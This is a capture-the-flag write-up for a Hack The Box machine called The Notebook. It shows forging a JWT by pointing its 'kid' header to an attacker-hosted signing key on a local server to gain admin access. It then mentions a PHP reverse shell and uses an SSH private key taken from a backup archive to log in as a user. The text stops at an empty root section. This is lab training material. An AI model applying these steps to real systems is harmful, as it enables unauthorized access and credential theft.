#  The Notebook
IP : 10.10.10.230

Nmap scan 

|Port|Service|
|---|---|
|22|ssh|
|80|http
|10010|rxapi|

Let start by looking at the webpage. It some kind of online notebook lets try and register. Once registered we see under notes it allows us to create new notes. There is not much functionality to be exploited, inspecting the site I notes there is a jwt token. 

The token can be decoded on jwt.io look at how the kid paramter point to an internal resource, they try exploit by pointing to our own computer.

First generate a key 

````base
ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
````

now edit the JWT token. 
````base
echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.200:7070/privKey.key"}' |base64
echo '{"username":"test123","email":"test@test.htb","admin_cap":true}' |base64
````

paste the two result into jwt.io remeber to add a . between the two results. 
and the result of the private key to get a jwt token. 

Use python to host the privKey.key
````bash
python -m http.server 7070
````

And I got access to the admin portal. 
open a netcat listner and upload a reverse php shell and get access to "ww-data"
lets try and esculate to user. 
During emulation I found backups files inside /var/backups 
lets unpack them I see it I find anything interresting. 

````bash 
tar -zxvf home.tar.gz -C /tmp
```` 

And why do I stop an id_rsa file which can be used to login to Noah without password.

````bash
cat /tmp/key/home/noah/.ssh/id_rsa
````

copy the key to the machine. 
````bash
touch id_rsa
nano ida_rsa
chmod 600 id_rsa
ssh -i id_rsa noah@thenotebook.htb
cat user.txt
````

## Root